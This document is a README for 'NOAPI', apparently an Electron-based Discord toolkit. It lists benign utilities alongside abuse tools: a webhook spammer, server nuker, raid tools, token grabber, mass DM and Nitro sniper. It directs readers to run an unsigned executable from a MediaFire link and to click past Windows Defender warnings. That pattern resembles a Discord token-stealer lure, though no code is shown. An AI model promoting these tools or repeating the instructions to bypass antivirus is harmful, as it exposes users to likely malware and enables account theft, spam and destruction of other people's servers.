# NOAPI - Discord Developer Toolkit

<div align="center">

![NOAPI Logo](logo.ico)

**A powerful all-in-one Discord developer toolkit with 60+ tools**

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Electron](https://img.shields.io/badge/Electron-24.8.8-47848F.svg)](https://www.electronjs.org/)
[![Discord.js](https://img.shields.io/badge/Discord.js-14.24.2-5865F2.svg)](https://discord.js.org/)

[Download](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file) • [Features](#features) • [Installation](#installation) • [Usage](#usage)

</div>

---

## 📋 Overview

NOAPI is a comprehensive Discord developer toolkit built with Electron, featuring a modern dark-themed interface with 60+ tools across 6 categories. Perfect for Discord server management, bot development, and automation tasks.

## ✨ Features

### 🖥️ Server Management
- **Server Info** - View detailed server information
- **Server Cloner** - Clone servers using template system (no admin required on source)
- **Server Cleaner** - Selectively delete channels, roles, and emojis
- **Channel Manager** - Create and manage channels
- **Role Manager** - Create and manage roles
- **Emoji Manager** - Manage server emojis
- **Invite Generator** - Generate server invites
- **Audit Log Viewer** - View server audit logs

### 👤 User Tools
- **User Info** - Get detailed user information
- **Avatar Grabber** - Download user avatars
- **DM Tools** - Send direct messages
- **Mass DM** - Send messages to multiple users
- **Friend Manager** - Manage friend requests
- **Status Changer** - Change user status
- **Hypesquad Changer** - Change Hypesquad house
- **Token Info** - View token information

### 🤖 Bot Development
- **Bot Token Generator** - Generate bot tokens
- **Webhook Manager** - Create and manage webhooks
- **Embed Builder** - Create rich embeds
- **Permission Calculator** - Calculate bot permissions
- **Invite Link Generator** - Generate bot invite links
- **Auto Responder** - Automated message responses
- **Command Handler** - Bot command management
- **Event Logger** - Log bot events

### 🛠️ Utilities
- **Token Checker** - Validate Discord tokens
- **ID to Date** - Convert Snowflake IDs to dates
- **Base64 Encoder/Decoder** - Encode/decode Base64
- **JSON Formatter** - Format and validate JSON
- **Color Picker** - Pick and convert colors
- **Hash Generator** - Generate MD5/SHA hashes
- **Regex Tester** - Test regular expressions
- **QR Code Generator** - Generate QR codes

### 🚀 Advanced
- **Webhook Spammer** - Spam webhooks (use responsibly)
- **Server Nuker** - Delete all channels/roles (destructive)
- **Nitro Sniper** - Snipe Nitro codes
- **Message Logger** - Log channel messages
- **Raid Tools** - Server raid utilities
- **Token Grabber** - Token extraction tools
- **Backup Manager** - Backup server data
- **API Tester** - Test Discord API endpoints

### 📊 Analytics
- **Message Analytics** - Analyze channel messages
- **Growth Tracking** - Track server growth
- **Activity Monitor** - Monitor server activity
- **Member Analytics** - Analyze member statistics
- **Engagement Metrics** - Track engagement rates
- **Channel Statistics** - View channel stats
- **Role Distribution** - Analyze role distribution
- **Join/Leave Tracker** - Track member joins/leaves

## 🎨 Interface

- **Modern Dark Theme** - Eye-friendly professional design
- **Category Navigation** - Organized tabs with arrow navigation
- **Searchable Sidebar** - Quick tool search functionality
- **Keyboard Shortcuts** - `Ctrl+K` to search, `Esc` to clear, `←/→` for navigation
- **Responsive Layout** - Collapsible sidebar with 260px width
- **Status Displays** - Real-time feedback for all operations

## 📥 Installation

### Download Pre-built Binary
1. **[Download NOAPI v1.0.0](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file)** (~200 MB)
2. Run the executable - no installation required!
3. If Windows Defender blocks it, click "More info" → "Run anyway"

### Build from Source
```bash
# Clone the repository
git clone https://github.com/yourusername/noapi.git
cd noapi

# Install dependencies
npm install

# Run in development mode
npm start

# Build for production (requires Admin privileges)
npm run build
```

## 🚀 Usage

1. Launch NOAPI.exe
2. Select a category from the top navigation bar
3. Choose a tool from the sidebar
4. Enter required information (tokens, IDs, etc.)
5. Click the action button to execute

### Token Support
- **Bot Tokens** - Automatically detected and formatted
- **User Tokens** - Supported for user-specific operations
- Auto-detection handles both formats seamlessly

### Server Cloning
1. Enter source server ID and token
2. Click "Clone Server" to save as template
3. Enter target server ID
4. Select items to delete before cloning
5. Apply template to target server

## ⚠️ Important Notes

### Security
- Never share your Discord tokens
- Use user tokens at your own risk (violates Discord ToS)
- Some tools may trigger Discord's anti-spam measures

### Disclaimer
This tool is for educational purposes only. Users are responsible for complying with Discord's Terms of Service. Misuse may result in account termination.

### Windows Defender
The application is unsigned and may trigger Windows Defender warnings. Click "More info" → "Run anyway" to proceed.

## 🛠️ Technical Details

- **Framework**: Electron 24.8.8
- **Discord Library**: Discord.js 14.24.2
- **Architecture**: Modular tool system with dynamic UI generation
- **API**: Discord API v10
- **Size**: ~150-200 MB (portable)

## 📝 Development

### Project Structure
```
NOAPI/
├── assets/
│   ├── css/
│   │   └── main.css          # Professional dark theme
│   └── js/
│       ├── tools-config.js   # Tool definitions
│       └── ui-generator.js   # Dynamic UI generation
├── index.html                # Main HTML structure
├── renderer.js               # Tool implementations
├── main.js                   # Electron main process
├── package.json              # Project configuration
└── logo.ico                  # Application icon
```

### Adding New Tools
1. Add tool definition to `tools-config.js`
2. Implement tool function in `renderer.js`
3. UI is automatically generated

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔗 Links

- [Discord API Documentation](https://discord.com/developers/docs)
- [Electron Documentation](https://www.electronjs.org/docs)
- [Discord.js Guide](https://discordjs.guide/)

## ⭐ Support

If you find this tool useful, please consider giving it a star on GitHub!

---

<div align="center">

**Made with ❤️ for the Discord developer community**

</div>
